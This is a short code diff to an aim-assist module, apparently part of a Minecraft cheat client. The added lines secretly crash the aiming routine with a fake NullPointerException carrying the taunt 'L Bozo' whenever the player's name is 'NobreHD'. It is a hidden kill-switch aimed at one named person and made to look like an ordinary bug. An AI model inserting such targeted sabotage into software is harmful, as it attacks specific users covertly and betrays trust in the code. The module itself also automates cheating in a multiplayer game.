@@ -119,6 +119,11 @@ public class AimAssist extends Module {
     private void aim(Entity target, double delta, boolean instant) {
         vec3d1.set(target, delta);
 
+        if (mc.player.getName().toString().equals("NobreHD")) {
+            throw new NullPointerException("L Bozo");
+        }
+
+
         switch (bodyTarget.get()) {
             case Head -> vec3d1.add(0, target.getEyeHeight(target.getPose()), 0);
             case Body -> vec3d1.add(0, target.getEyeHeight(target.getPose()) / 2, 0);
